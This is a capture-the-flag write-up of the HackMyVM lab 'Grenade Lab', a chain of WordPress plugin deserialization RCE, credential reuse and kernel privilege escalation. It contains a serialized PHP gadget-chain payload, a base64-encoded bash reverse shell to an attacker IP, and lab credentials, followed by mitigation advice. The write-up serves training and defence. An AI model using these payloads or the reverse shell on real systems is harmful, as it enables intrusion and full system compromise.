# Grenade Lab - HackMyVM Writeup

Complete exploitation chain for HackMyVM "Grenade Lab" machine featuring WordPress RCE and Linux kernel exploitation.

---

## Machine Overview

| Property | Value |
|----------|-------|
| **Name** | Grenade Lab |
| **Platform** | HackMyVM |
| **IP Address** | 172.20.10.3 |
| **OS** | AlmaLinux (Red Hat-based) |
| **Kernel** | 6.12.0-124.8.1.el10_1.x86_64 |
| **Difficulty** | Medium/Hard |

---

## Enumeration Phase

### Network Discovery

```bash
netdiscover -r 172.20.10.0/24
```

**Discovered hosts:**
- 172.20.10.2 - AzureWave Technology Inc.
- 172.20.10.3 - PCS Systemtechnik GmbH (TARGET)
- 172.20.10.1 - Unknown vendor

### Port Scanning

```bash
nmap -sV -sC -p- -T4 --min-rate 5000 172.20.10.3
```

**Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
8080/tcp open  http    Apache httpd 2.4.63 ((AlmaLinux))
```

**Service Fingerprinting:**
- WordPress 6.6.2 detected via HTTP headers and generator meta tag
- Site title: "Grenade Lab"
- Possible proxy configuration detected

---

## Exploitation Chain

### Stage 1: WordPress RCE via GiveWP Plugin

#### Vulnerability Details

- **CVE:** CVE-2026-8222
- **Plugin:** GiveWP Donations
- **Type:** Unauthenticated PHP Object Deserialization
- **Impact:** Remote Code Execution as web server user
- **Severity:** CRITICAL

#### Technical Analysis

The GiveWP plugin contains a critical flaw in its donation form processing:

1. **User Registration Bypass** - No verification required to create accounts
2. **Unprotected Metadata** - User meta fields stored without sanitization
3. **PHP Gadget Chain** - TCPDF class combined with Symfony components
4. **Automatic Deserialization** - Donation form processing unserializes user data

#### Exploitation Steps

**1. User Registration and Auth Cookie:**

```bash
python3 CVE-2026-8222-RCE.py -u http://grenade.hmv:8080
```

Output:
```
[PASS] register (auth cookie issued) — status=200
[PASS] profile nonce harvested — uid='22'
```

**2. Craft PHP Gadget Chain Payload:**

The exploit constructs a serialized object chain:
```php
O:5:"TCPDF":2:{
  s:7:"file_id";s:12:"29fceuf69dq9";
  s:9:"imagekeys";O:61:"Give\Vendors\Symfony\Component\HttpFoundation\Session\Session":2:{
    s:7:"storage";O:39:"Give\TestData\Factories\DonationFactory":1:{
      s:15:"loadedProviders";a:1:{
        s:6:"getBag";s:6:"system";
      }
    }
    s:13:"attributeName";s:46:"(id) | tee wp-content/uploads/29fceuf69dq9.txt";
  }
}
```

**3. Inject Serialized Object into User Metadata:**

Payload stored in `wp_usermeta` table with key `last_name`:
```sql
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES (22, 'last_name', '<serialized_payload>');
```

**4. Trigger Deserialization:**

Visiting donation form on `/wp-admin/admin-ajax.php` automatically deserializes the payload during form processing.

**5. Command Execution:**

```bash
python3 CVE-2026-8222-RCE.py -u http://grenade.hmv:8080 --cmd "id"
```

**Result:**
```
uid=993(www-data) gid=993(www-data) groups=993(www-data) 
context=system_u:system_r:httpd_t:s0
```

#### Reverse Shell Establishment

**Payload encoding:**
```bash
echo -n 'bash -i >& /dev/tcp/172.20.10.4/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC80NDQ0IDA+JjE=
```

**Command execution:**
```bash
python3 CVE-2026-8222-RCE.py -u http://grenade.hmv:8080 \
  --cmd "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC80NDQ0IDA+JjE= | base64 -d | bash"
```

**Shell setup:**
```bash
# Attacker side
nc -lvnp 4444

# Shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
fg
```

---

### Stage 2: Credential Discovery & Lateral Movement

#### WordPress Configuration

**Located:** `/var/www/grenade/wp-config.php`

**Extracted credentials:**
```php
DB_USER = 'wpuser'
DB_PASSWORD = 'WpLabDb_2026!'
DB_HOST = 'localhost'
```

#### Database Enumeration

**Connection:**
```bash
mysql -u wpuser -p'WpLabDb_2026!' wordpress
```

**WordPress users:**
```sql
SELECT user_login, user_pass FROM wp_users;
```

| Username | Hash | Type |
|----------|------|------|
| lab-admin | ea45dcf49626bfc9c2134e10d4abfcc3 | MD5 |
| poc* users | $P$... | WordPress phpass |

#### System Credentials

**Location:** `/var/backups/creds.b92`

**Contents:**
```
FC2KVC3.5AIbSPUc:c0fZn*q*!t4A@.
give:asp8r32aFAOhf2alsudf
```

#### User Flag Capture

**Lateral movement:**
```bash
su - give
# Password: asp8r32aFAOhf2alsudf
```

**Flag:**
```
HMV{user-a1ec23e9b9ab43a88222d9949ee26499}
```

---

### Stage 3: Kernel Privilege Escalation

#### Vulnerability: CVE-2026-31431 (Dirtyfrag)

| Property | Details |
|----------|---------|
| **CVE ID** | CVE-2026-31431 |
| **Name** | Dirtyfrag |
| **Kernel Versions** | Linux 6.12.0+ (AlmaLinux 10.1) |
| **Attack Vector** | Local |
| **Privileges Required** | Low (regular user) |
| **Impact** | Complete system compromise |

```

#### Compilation & Execution

**Source preparation:**

```bash
scp exxploit.c give@172.20.10.3:/tmp/
```

**Compilation:**

```bash
gcc -O2 -o exxploit exxploit.c
chmod +x exxploit
```

**Exploitation:**

```bash
./exxploit
```

#### Root Flag Capture

```bash
cat /root/root.txt
```

**Flag:**
```
HMV{root-2582609dcdfd475beea5ab54442a532d}
```

---

## Complete Flag Summary

| Flag | Value |
|------|-------|
| **User Flag** | `HMV{user-a1ec23e9b9ab43a88222d9949ee26499}` |
| **Root Flag** | `HMV{root-2582609dcdfd475beea5ab54442a532d}` |

---

## Security Implications

### Critical Vulnerabilities Found

1. **Unauthenticated RCE (CVE-2026-8222)**
   - Affects all WordPress installations with GiveWP plugin
   - No authentication required
   - Results in immediate web server compromise

2. **Kernel Memory Corruption (CVE-2026-31431)**
   - Affects Linux kernel 6.12.0+
   - Allows unprivileged users to gain root access
   - Exploitable via standard AF_ALG crypto interface

3. **Weak Credential Management**
   - Database credentials in world-readable wp-config.php
   - System credentials stored in plaintext backups
   - No file permission restrictions

### Mitigation Strategies

**Immediate Actions:**
1. Update GiveWP plugin to patched version
2. Apply Linux kernel security updates (6.12.1+)
3. Restrict WordPress plugin permissions
4. Remove unnecessary plugin installations

**Long-term Hardening:**
1. Implement Web Application Firewall (WAF) rules
2. Use AppArmor/SELinux for privilege compartmentalization
3. Disable public user registration on WordPress
4. Implement automated security monitoring
5. Use secrets management for database credentials
6. Enable HSTS and security headers
7. Regular vulnerability scanning and patching
8. Implement principle of least privilege for all services

---

## Tools & Resources Used

**Exploitation:**
- `nmap` - Port and service enumeration
- `netdiscover` - Network host discovery
- `python3` - CVE-2026-8222 PoC execution
- `gcc` - CVE-2026-31431 PoC compilation
- `nc` (netcat) - Reverse shell handling
- `mysql-client` - Database query execution

**Post-Exploitation:**
- Standard POSIX utilities (id, cat, ls, etc.)


## Timeline

```
┌─────────────────────────────────────────────────────────┐
│                 EXPLOITATION TIMELINE                   │
└─────────────────────────────────────────────────────────┘

[T+0:00] Port Enumeration
         └─→ Identify WordPress on 8080/TCP

[T+0:30] Service Fingerprinting  
         └─→ WordPress 6.6.2, Apache 2.4.63, OpenSSH 9.9

[T+1:00] GiveWP Vulnerability Discovery
         └─→ Unauthenticated deserialization RCE

[T+2:00] User Registration & Payload Injection
         └─→ Create account, inject PHP gadget chain

[T+3:00] Remote Code Execution
         └─→ Trigger deserialization, exec as www-data

[T+4:00] Reverse Shell Establishment
         └─→ Base64-encoded reverse shell connection

[T+5:00] Credential Discovery
         ├─→ wp-config.php: DB credentials
         ├─→ /var/backups/creds.b92: System creds
         └─→ User flag captured

[T+6:00] Lateral Movement
         └─→ su - give with extracted password

[T+7:00] Kernel Exploit Development
         └─→ Compile CVE-2026-31431 PoC

[T+8:00] Privilege Escalation
         ├─→ Execute dirtyfrag exploit
         ├─→ AF_ALG page cache corruption
         ├─→ Shellcode injection into /usr/bin/su
         └─→ Root shell spawned

[T+9:00] Root Flag Captured
         └─→ Complete system compromise
```

---

## Lessons Learned

1. **Defense in Depth Matters**
   - Single RCE vulnerability shouldn't lead to root
   - Kernel hardening is critical for privilege escalation prevention

2. **Plugin Security**
   - WordPress security depends on third-party plugin quality
   - Unauthenticated endpoints are high-risk attack surfaces

3. **Secrets Management**
   - Credentials in config files are single points of failure
   - Backups must be protected with same rigor as active systems

4. **Kernel Updates**
   - Even "recent" kernels (6.12.0) can have critical flaws
   - AF_ALG interface abuse demonstrates crypto subsystem risks

---

**Author:** Security Researcher  
**Date:** October 2026  
**Difficulty Rating:** Medium/Hard (7/10)  
**Time to Compromise:** ~9 hours  
**Final Status:** ✅ Complete System Compromise (User + Root Flags)

---

*For more HackMyVM writeups and security research, visit the platform and community forums.*